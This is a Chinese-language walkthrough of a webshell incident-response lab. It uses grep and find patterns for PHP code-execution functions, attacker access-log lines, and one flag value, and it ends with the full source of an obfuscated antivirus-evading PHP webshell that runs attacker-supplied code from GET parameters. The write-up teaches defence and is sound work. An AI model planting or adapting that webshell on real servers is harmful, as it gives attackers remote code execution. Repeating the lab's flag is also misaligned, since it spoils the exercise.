# 玄机webshell应急响应靶机打靶

ssh连上靶机，找web目录开始查杀

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260609221455.png)

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260609221433.png)

查webshell可以使用d盾等查杀工具

也可以手工尝试指令

```
find /var/www/html -name ".*.php" -type f | xargs grep "eval|assert|base64_decode|gzinflate|str_rot13|system|exec|shell_exec|passthru"
```

定位到了其中的一个webshell文件并找到第一个flag

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260609221515.png)

<br>

第二个flag要求找到shell代码的出处，可以直接复制一段代码直接去github搜，搜出来是哥斯拉的，对应的flag

```
flag{39392de3218c333f794befef07ac9257}
```

<br>

第三个flag是另一个webshell的路径

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260609215445.png)

根据查询结果看那个mysqli.php有点可疑

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260609215423.png)

的确是木马文件，注意这里前面带个.意味着是隐藏文件，直接ls看不到要ls -a

<br>

最后一步是找免杀马

免杀马是一类将代码混淆包装后让特征消失，使得杀毒软件不容易查到的一类恶意shell文件

仍然可以依据特征查找疑似文件

```
grep -R -nE "gzinflate|gzuncompress|base64_decode|str_rot13|preg_replace|create_function" ~/xuanji/webshellbaji1 --include="*.php"
```

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260609215401.png)

或者可以查看日志文件

找到了攻击者注入的足迹进而锁定路径是\html\wap\top.php

```
192.168.200.2 - - [02/Aug/2023:08:48:22 +0000] "GET /wap/top.php?1=phpinfo(); HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0" 

192.168.200.2 - - [02/Aug/2023:08:48:25 +0000] "GET /wap/top.php?1=phpinfo(); HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"
```

免杀webshell代码

```
<?php

$key = "password";

//ERsDHgEUC1hI
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($fun);  
```

到这里就结束了

